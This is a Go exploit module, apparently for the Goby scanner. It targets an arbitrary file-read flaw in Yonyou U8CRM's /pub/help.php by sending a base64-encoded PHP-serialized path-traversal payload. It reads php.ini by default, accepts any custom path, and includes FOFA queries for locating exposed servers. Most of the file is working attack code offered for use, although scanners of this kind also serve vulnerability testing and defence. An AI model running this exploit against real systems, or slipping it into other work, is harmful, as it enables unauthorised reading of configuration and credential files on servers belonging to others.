package exploits

import (
	"encoding/base64"
	"fmt"
	"regexp"
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "Yonyou Customer Relationship Management System help.php File Read Vulnerability",
    "Description": "<p>Yonyou U8CRM is an enterprise level customer relationship management (CRM) software developed by Yonyou Software. It is a customer management solution for enterprises, helping them achieve comprehensive automation of customer relationship management.</p>",
    "Product": "yonyou-U8CRM",
    "Homepage": "https://www.yonyou.com/",
    "DisclosureDate": "2024-08-01",
    "PostTime": "2024-07-23",
    "Author": "harsonyoung@qq.com",
    "FofaQuery": "title=\"用友U8CRM\" || (body==\"用友网络科技股份有限公司\" || body=\"js/ext/build/locale/ext-lang-zh-CN.js\") && body=\"login\"",
    "GobyQuery": "title=\"用友U8CRM\" || (body==\"用友网络科技股份有限公司\" || body=\"js/ext/build/locale/ext-lang-zh-CN.js\") && body=\"login\"",
    "Level": "1",
    "Impact": "<p>Attackers can use this vulnerability to read importantsystem files (such as database configuration files, systemconfiguration files), database configuration files, etc.,resulting in an extremely insecure state of the website.</p>",
    "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update: <a href=\"https://security.yonyou.com/#/patchList\">https://security.yonyou.com/#/patchList</a></p><p> 2. Set access policies and whitelist access through security devices such as firewalls. </p><p> 3. If not necessary, prohibit public network access to the system. </p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "php.ini,Customize",
            "show": ""
        },
        {
            "name": "Customize",
            "type": "input",
            "value": "/../../../apache/php.ini",
            "show": "mode=Customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "HW-2024",
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "6",
    "Translation": {
        "CN": {
            "Name": "用友CRM客户关系管理系统 help.php 文件读取漏洞",
            "Product": "用友U8CRM",
            "Description": "<p>用友U8CRM是用友软件开发的一款企业级客户关系管理（CRM）软件。它是一个面向企业的客户管理解决方案，帮助企业实现客户关系管理的全面自动化。<br></p>",
            "Recommendation": "<p>1、官⽅暂未修复该漏洞，请⽤户联系⼚商修复漏洞：<a href=\"https://security.yonyou.com/#/patchList\">https://security.yonyou.com/#/patchList</a></p><p>&nbsp;2、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。&nbsp;</p><p>3、如⾮必要，禁⽌公⽹访问该系统。<br></p>",
            "Impact": "<p>攻击者可通过该漏洞读取系统重要⽂件（如数据库配置⽂件、系统配置⽂件）、数据库配置⽂件等等，导致⽹站处于极度不安全状态。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "HW-2024",
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Yonyou Customer Relationship Management System help.php File Read Vulnerability",
            "Product": "yonyou-U8CRM",
            "Description": "<p>Yonyou U8CRM is an enterprise level customer relationship management (CRM) software developed by Yonyou Software. It is a customer management solution for enterprises, helping them achieve comprehensive automation of customer relationship management.<br></p>",
            "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:&nbsp;<a href=\"https://security.yonyou.com/#/patchList\">https://security.yonyou.com/#/patchList</a></p><p>&nbsp;2. Set access policies and whitelist access through security devices such as firewalls.&nbsp;</p><p>&nbsp;3. If not necessary, prohibit public network access to the system.&nbsp;<br></p>",
            "Impact": "<p>Attackers can use this vulnerability to read importantsystem files (such as database configuration files, systemconfiguration files), database configuration files, etc.,resulting in an extremely insecure state of the website.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "HW-2024",
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "9931"
}`

	postOrGet_Hj907425Wx := func(hostInfo *httpclient.FixUrl, filePath string) (string, error) {
		respTxt := ""
		filePathLen := len(filePath)
		phpSerStr := fmt.Sprintf("a:3:{i:0;s:%d:\"%s\";i:1;s:1:\"1\";i:2;s:1:\"2\";}", filePathLen, filePath)
		payloadB64 := base64.StdEncoding.EncodeToString([]byte(phpSerStr))

		getRequestConfig := httpclient.NewGetRequestConfig("/pub/help.php?key=" + payloadB64)
		getRequestConfig.VerifyTls = false
		getRequestConfig.FollowRedirect = false
		//请求
		response, err := httpclient.DoHttpRequest(hostInfo, getRequestConfig)

		if err != nil || response == nil {
			return "", err
		}

		regCont := `<div id="maincontent">((\s|.)*?)<\/div>`
		reRequest := regexp.MustCompile(regCont)
		if !reRequest.MatchString(response.RawBody) {
			return "", fmt.Errorf("can't match value")
		}
		getname := reRequest.FindStringSubmatch(response.RawBody)
		respTxt = getname[1]
		// 注意：返回值为（最终要返回的读取结果，错误）
		return respTxt, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：设置成功后的vulurl
			vulURL := "/pub/help.php"
			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
			defaultModeMap := map[string]string{
				"/../../../apache/conf/charset.conv": "Lang-abbv Charset",
			}
			// 函数继承
			fileReadFunc := postOrGet_Hj907425Wx

			// 请注意：后续代码为模板代码，非特殊情况，无需更改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			for filePath, fileText := range defaultModeMap {
				resp, err := fileReadFunc(u, filePath)
				if err != nil {
					continue
				}
				if strings.Contains(resp, fileText) {
					// 设置VULURL
					ss.VulURL = u.HostInfo + vulURL
					return true
				}
			}
			return false
		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var fileUrl string
			var fileText string
			mode := goutils.B2S(ss.Params["mode"])
			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
			defaultModeMap := map[string][2]string{
				"php.ini": {"/../../../apache/php.ini", "PHP's initialization file"},
			}
			// 此处需要修改：函数继承
			fileReadFunc := postOrGet_Hj907425Wx

			// 请注意，后续代码为模板固化，正常情况下均无需修改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			if mode == "Customize" {
				fileUrl = goutils.B2S(ss.Params["Customize"])
			} else {
				if _, ok := defaultModeMap[mode]; ok {
					fileUrl = defaultModeMap[mode][0]
					fileText = defaultModeMap[mode][1]
				} else {
					expResult.Success = false
					return expResult
				}
			}

			// 获取返回结果url和返回请求头
			resp, err := fileReadFunc(expResult.HostInfo, fileUrl)
			if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {
				expResult.Success = false
				return expResult
			}

			expResult.Success = true
			expResult.Output = resp
			return expResult
		},
	))
}
